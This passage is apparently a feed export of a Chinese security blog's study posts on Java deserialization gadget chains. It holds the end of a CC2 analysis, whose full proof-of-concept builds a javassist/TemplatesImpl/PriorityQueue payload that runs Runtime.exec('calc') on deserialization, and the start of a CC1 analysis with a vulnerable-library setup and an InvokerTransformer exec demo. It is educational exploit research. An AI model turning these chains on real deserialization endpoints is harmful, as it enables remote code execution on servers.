class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        TransformingComparator cp=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方法一：直接new PriorityQueue对象时候添加构造器，该方法调试会抛出异常</span></span><br><span class="line">        PriorityQueue pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,cp);</span><br><span class="line">        pq.add(<span class="number">1</span>);</span><br><span class="line">        pq.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方式二：通过反射设置比较器执行</span></span><br><span class="line">        <span class="comment">//PriorityQueue pq=new PriorityQueue(2);</span></span><br><span class="line">        <span class="comment">//pq.add(1);</span></span><br><span class="line">        <span class="comment">//pq.add(2);</span></span><br><span class="line">        <span class="comment">//Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);</span></span><br><span class="line">        <span class="comment">//field.setAccessible(true);</span></span><br><span class="line">        <span class="comment">//field.set(pq,cp);</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//序列化PriorityQueue对象</span></span><br><span class="line">            ObjectOutputStream out=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">            out.writeObject(pq);</span><br><span class="line">            <span class="comment">//反序列化触发漏洞</span></span><br><span class="line">            ObjectInputStream os=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">            os.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>执行实现</p><p><img src="/posts/7e30cd4a/cc2-23.png" title="POC执行"></p><p>运行报错原因：</p><p>这里提示有报错，原因是添加的元素无法通过指定的比较器进行比较，从而抛出的异常（添加的元素为数字，比较器为ChainedTransformer对象，两者没有关联关系，自然无法通过该比较器对数值进行比较），但利用链能全部调用，达到执行的效果。</p><p>调试报错原因：</p><p>在调试过程中发现，第一种方式无法进行反序列化步骤的调试，调试会直接抛出异常，因为在声明PriorityQueue对象时先传递入比较器，在添加元素时，会自动引入比较器进行比较，因为无法比较，所以编译文件时直接抛出异常，无法进行调试。<br>而第二种是先声明PriorityQueue对象，添加元素 再通过反射去调用设置比较器，因此可以调试到反序列化的步骤，到最后再进行比较的时候出错再抛出异常。<br>（引用反射的知识，动态调用在用到该反射的时候出错才会抛出异常，而普通用法会在编译的时候会直接调用出错就抛出异常）</p><h1 id="0x05、CC2-yso利用链分析"><a href="#0x05、CC2-yso利用链分析" class="headerlink" title="0x05、CC2-yso利用链分析"></a>0x05、CC2-yso利用链分析</h1><h2 id="分析简述"><a href="#分析简述" class="headerlink" title="分析简述"></a>分析简述</h2><p>在yso利用链中，并没有使用上文cc2链分析的方法，加入了<code>javassist</code>和<code>TemplatesImpl</code>，通过<code>javassist</code>生成恶意字节码，再通过<code>TemplatesImpl</code>加载字节码返回类对象并实例化，通过上文基础知识对<strong>TemplatesImpl</strong>的了解，重点就在找到一个方法可以调用<code>getOutputProperties()</code>或者<code>newTransformer()</code>方法，去执行恶意代码。</p><p>到这也只有正向分析poc来查找调用关系</p><p>yso链的主要利用就是通过PriorityQueue优先级队列设置比较器，将InvokerTransformer(String methodName)方法作为比较器传递入PriorityQueue队列，其中在InvokerTransformer(String methodName)构造函数中传递newTransformer()方法作为参数。</p><h2 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h2><p>主体部分，javassist生成字节码，然后<code>TemplatesImpl</code>填充对应满足条件，可以直接先把上文中<code>TemplatesImpl</code>基础知识的实现demo搬过来</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>下一步，主体构造有了，但是需要有入口能调用<code>TemplatesImpl</code>对象的<code>newTransformer()</code>方法</p><p>通过<code>InvokerTransformer(String methodName)</code>方法调用<code>newTransformer()</code>方法或者<code>getOutputProperties()</code>方法都行</p><p><img src="/posts/7e30cd4a/cc2-36.png" title="InvokerTransformer"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过反射调用InvokerTransformer的带参构造方法，参数为执行的方法名，因此传递类型为String.class</span></span><br><span class="line">        Constructor cons=Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        <span class="comment">//突破限制，强制调用</span></span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//生成InvokerTransformer对象,引用构造函数，参数为getOutputProperties方法名</span></span><br><span class="line">        InvokerTransformer invokerTransformer=(InvokerTransformer) cons.newInstance(<span class="string">&quot;getOutputProperties&quot;</span>);</span><br></pre></td></tr></table></figure><p><code>getOutputProperties()</code>方法名传递进<code>invokerTransformer</code>对象了，接下来就是跟CC2链分析的调用情况一样，设置比较器，将<code>invokerTransformer</code>作为比较器赋值给<code>TransformingComparator</code>对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置比较器，目的调用compare方法,再通过,执行getOutputProperties方法</span></span><br><span class="line">        TransformingComparator comparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br></pre></td></tr></table></figure><p>比较器有了，现在创建PriorityQueue队列，通过反射设置size大小以及比较器，由CC2分析的时候知道调用compare方法是关键，因为跟上文的cc2调用情况不一样，上文调用了<code>ChainedTransformer</code>类把恶意代码执行串起来了，因此队列add进去的参数无所谓</p><p>但这个cc2-yso调用是先设置<code>InvokerTransformer(String methodName)</code>构造函数传递入<code>getOutputProperties</code>方法，最后再通过compare传递入TemplatesImpl对象来调用，相当于执行<code>InvokerTransformer.transform(TemplatesImpl)</code>，最后执行效果为<code>TemplatesImpl.getOutputProperties()</code>达到目的</p><p><img src="/posts/7e30cd4a/cc2-37.png" title="compare"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置比较器，目的调用compare方法去执行invokerTransformer.transform(),执行getOutputProperties方法</span></span><br><span class="line">        TransformingComparator comparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br><span class="line">        <span class="comment">//设置优先级队列对象</span></span><br><span class="line">        PriorityQueue pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置size大小，满足大于2的条件</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;size&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置比较器</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line">        <span class="comment">//设置传递的队列元素</span></span><br><span class="line">        Object[] list=<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="comment">//向PriorityQueue队列添加元素</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;queue&quot;</span>,list);</span><br></pre></td></tr></table></figure><p>结合以上得到最后的poc：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//通过反射调用InvokerTransformer的带参构造方法，参数为执行的方法名，因此传递类型为String.class</span></span><br><span class="line">        Constructor cons=Class.forName(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        <span class="comment">//突破限制，强制调用</span></span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//生成InvokerTransformer对象,引用构造函数，参数为getOutputProperties方法名，也可以为newTransformer方法名</span></span><br><span class="line">        InvokerTransformer invokerTransformer=(InvokerTransformer) cons.newInstance(<span class="string">&quot;getOutputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons2=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置比较器，目的调用compare方法去执行invokerTransformer.transform(),执行getOutputProperties方法</span></span><br><span class="line">        TransformingComparator comparator=<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(invokerTransformer);</span><br><span class="line">        <span class="comment">//设置优先级队列对象</span></span><br><span class="line">        PriorityQueue pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置size大小，满足大于2的条件</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;size&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置比较器</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line">        <span class="comment">//设置传递的队列元素，需要将templates对象传入，目的调用InvokerTransformer.transform(TemplatesImpl)</span></span><br><span class="line">        Object[] list=<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="comment">//向PriorityQueue队列添加元素</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;queue&quot;</span>,list);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc2payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(pq);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc2payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>实现demo：<br><img src="/posts/7e30cd4a/cc2-38.png" title="实现demo"></p><p>其中报错跟上文cc2分析和<code>TemplatesImpl</code>类学习的报错一样就不再赘述了</p><h1 id="0x06、总结"><a href="#0x06、总结" class="headerlink" title="0x06、总结"></a>0x06、总结</h1><p>总的来说cc2-yso链比普通链复杂了很多，其中也学习了javassist生成字节码，再到TemplatesImpl去读取字节码实例化，最后结合优先级队列实现命令执行。<br>绕来绕去这中间确实花了不少时间，有些调用细节还是需要多看一下才能发现精髓（也确实费时间），但对调用的很多类都还没有从jdk源码上真正明白他们每个类的每个方法是实现怎样的作用，只从利用链角度去了解了调用到的链的类的相关原理，后面尽量多去了解那些类的原理。</p><h1 id="0x07、参考链接"><a href="#0x07、参考链接" class="headerlink" title="0x07、参考链接"></a>0x07、参考链接</h1><p><a href="https://www.cnblogs.com/nice0e3/p/13811335.html">https://www.cnblogs.com/nice0e3/p/13811335.html</a><br><a href="https://www.cnblogs.com/hlkawa/p/15383289.html">https://www.cnblogs.com/hlkawa/p/15383289.html</a><br><a href="https://www.jianshu.com/p/cb591a12f50c">https://www.jianshu.com/p/cb591a12f50c</a><br><a href="https://paper.seebug.org/1242/#commonscollections-2">https://paper.seebug.org/1242/#commonscollections-2</a><br><a href="https://www.anquanke.com/post/id/247044?from=timeline#h2-0">https://www.anquanke.com/post/id/247044?from=timeline#h2-0</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-CC1链学习与分析</title>
      <link href="/posts/dd664be3.html"/>
      <url>/posts/dd664be3.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>针对CC链的分析，主要还是以逆向思维为主（从结果分析过程），从中尽可能学习出问题的地方在哪，哪里调用的这个带问题的地方，一步步思考。</p><h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p><blockquote><p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p></blockquote><p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p><p>CC1链分为两条链，一条为<code>TransformedMap</code>(也是最初的CC1链)，一条为<code>LazyMap</code>，其中有的分析把<code>TransformedMap</code>链单独分出来作为CC链，把<code>LazyMap</code>链作为CC1链。也可以作为CC1的两条链，一起学习下。</p><h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66(cc1链要求java版本小于jdk8u71,不得不说这个版本确实有点老了)<br><br>jdk官方下载链接：<a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html%EF%BC%8C%E6%89%BE%E5%88%B0%E5%AF%B9%E5%BA%94%E7%89%88%E6%9C%AC%E4%BD%8E%E4%BA%8E8u71%E7%9A%84%E5%B0%B1%E8%A1%8C%E3%80%82">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html，找到对应版本低于8u71的就行。</a></p><p><strong>添加Maven项目</strong><br>新建Maven项目——&gt;pom.xml添加Commons Collections组件依赖,3系列除3.2.2版本外，其余均收该漏洞影响，添加3系列其中一个版本即可</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p><img src="/posts/dd664be3/cc1-1.png" title="maven环境"></p><p><strong>导入sun包</strong></p><blockquote><p>因为cc1链需要用到sun包中的类，sun包在jdk中的代码是通过class文件反编译来的，为.class文件，查看不到源码.java文件，不便于调试，且直接观看class文件的阅读性跟java文件有出入，所以下载jdk源码sun包导入，便可查看到java源码文件，方便调试阅读</p></blockquote><p>步骤:<br>下载jdk源码：<a href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk">https://hg.openjdk.java.net/jdk8u/jdk8u/jdk</a><br>按网上步骤解压出src文件夹，再把&#x2F;src&#x2F;share&#x2F;classes&#x2F;sun文件夹放到解压出来的src文件夹根目录</p><p><img src="/posts/dd664be3/cc1-2.png" title="sun环境"><br><img src="/posts/dd664be3/cc1-3.png" title="sun环境"></p><p>在项目结构中对应jdk版本下添加包即可如下图</p><p><img src="/posts/dd664be3/cc1-4.png" title="sun环境"></p><p>随后在分析过程对应maven里Commons Collections包的class文件上方提示下载源代码，下载就可以看到Commons Collections包的java源码</p><p><img src="/posts/dd664be3/cc1-5.png" title="查看到源码"></p><h1 id="0x03、利用链接口及实现类"><a href="#0x03、利用链接口及实现类" class="headerlink" title="0x03、利用链接口及实现类"></a>0x03、利用链接口及实现类</h1><p>CC1链的利用点为<code>Commons Collections</code>包中的<code>Transformer</code>接口，通过下面后半段的利用链可以了解<code>Transformer</code>接口相关涉及实现它的<code>ChainedTransformer</code>类、<code>ConstantTransformer</code>类、<code>InvokerTransformer</code>类。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">yso-cc1链后半段利用链</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">    ConstantTransformer.transform()</span><br><span class="line">    InvokerTransformer.transform()</span><br><span class="line">        Method.invoke()</span><br><span class="line">            Class.getMethod()</span><br><span class="line">    InvokerTransformer.transform()</span><br><span class="line">        Method.invoke()</span><br><span class="line">            Runtime.getRuntime()</span><br><span class="line">    InvokerTransformer.transform()</span><br><span class="line">        Method.invoke()</span><br><span class="line">            Runtime.exec()</span><br></pre></td></tr></table></figure><h2 id="Transformer接口"><a href="#Transformer接口" class="headerlink" title="Transformer接口"></a>Transformer接口</h2><p>&#x2F;&#x2F;我理解为 转换器接口<br><code>Transformer</code>接口只有一个<code>public Object transform(Object input)</code>方法，返回一个被转换的Object对象</p><p><img src="/posts/dd664be3/cc1-6.png" title="Transformer接口"></p><p>Transformer接口实现的类，包括利用链中的关键的类，这些类都实现了<code>Transformer</code>以及序列化<code>serializable</code>。</p><p><img src="/posts/dd664be3/cc1-7.png" title="Transformer实现的类"></p><h2 id="ChainedTransformer类"><a href="#ChainedTransformer类" class="headerlink" title="ChainedTransformer类"></a>ChainedTransformer类</h2><p>&#x2F;&#x2F;我理解为 链转换类<br><code>ChainedTransformer</code>的作用为链式调用，将传入的<code>Transformer</code>数组依次调用每一个<code>Transformer</code>的<code>transform</code>方法，将第一个的转换返回<code>Object</code>对象的作为下次循环的的输入对象在<code>Transformer</code>的<code>transform</code>中被调用，以此循环。</p><p><img src="/posts/dd664be3/cc1-8.png" title="ChainedTransformer类"></p><h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p>&#x2F;&#x2F;我理解为 对象转换类<br>这里定义了一个<code>iConstant</code>对象<br><code>private final Object iConstant;</code></p><p><img src="/posts/dd664be3/cc1-9.png" title="ConstantTransformer类"></p><p>作用就是接受任何传进来的对象，并转换成定义的<code>iConstant</code>对象返回，相对起来很好理解。</p><h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>&#x2F;&#x2F;我理解为 调用转换类<br><code>InvokerTransformer</code>类的作用为获取调用的<font color="red">方法名</font>、<font color="red">参数类型</font>、<font color="red">函数的参数列表</font></p><p><img src="/posts/dd664be3/cc1-10.png" title="InvokerTransformer"></p><p>调用的<code>transform</code>获取了<font color="red">对象的类，方法、并返回执行方法，类、方法</font>、<font color="red">参数均为输入的对象，可控</font>，因此该类是cc1链的最重点的执行部分。</p><p><img src="/posts/dd664be3/cc1-11.png" title="InvokerTransformer"></p><p>通过正常反射执行<code>Runtime.exec()</code>方法</p><p><img src="/posts/dd664be3/cc1-12.png" title="正常反射执行exec"></p><p>通过<code>InvokerTransformer</code>类执行<code>Runtime.exec()</code>方法</p><p><img src="/posts/dd664be3/cc1-13.png" title="正常反射执行exec"></p><p>poc-demo:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//获取Runtime对象</span></span><br><span class="line">        Runtime run=Runtime.getRuntime();</span><br><span class="line">        <span class="comment">//通过Object对象反射回去Runtime对象</span></span><br><span class="line">        <span class="comment">//Object obj=Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;));</span></span><br><span class="line">        <span class="comment">//获取构造InvokerTransformer对象</span></span><br><span class="line">        InvokerTransformer iv=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        <span class="comment">//执行InvokerTransformer.transform方法</span></span><br><span class="line">        iv.transform(run);</span><br></pre></td></tr></table></figure><p>这下很好理解<code>InvokerTransformer</code>这个类的就是为了获取对象以及方法和执行参数，且该对象可控。</p><h1 id="0x04、CC1链分析"><a href="#0x04、CC1链分析" class="headerlink" title="0x04、CC1链分析"></a>0x04、CC1链分析</h1><p>从利用链接口和实现类可知<code>InvokerTransformer</code>为最后最重要的执行类，因此该链的分析思路就相对清晰，反查哪些类实现了<code>InvokerTransformer.transform()</code>方法，输入源为反序列化<code>readObject</code>，也就是先搜索最后调用了<code>InvokerTransformer.transform(Object)</code>方法，且实现<code>serializable</code>序列化，以<code>readObject</code>为输入源的类及方法。<br>搜索结果有21个，除去自身测试的，还有20个，满足上述条件（调用<code>transform(Object)</code>、实现了反序列化接口<code>serializable</code>）的有6个类。</p><p><img src="/posts/dd664be3/cc1-14.png" title="满足条件类"></p><p>共8个方法</p><p><img src="/posts/dd664be3/cc1-15.png" title="满足条件类"></p><p>先学习分析一下TransformedMap链和LazyMap链，也就是CC1的两条链。</p><h2 id="TransformedMap链"><a href="#TransformedMap链" class="headerlink" title="TransformedMap链"></a>TransformedMap链</h2><h3 id="分析"><a href="#分析" class="headerlink" 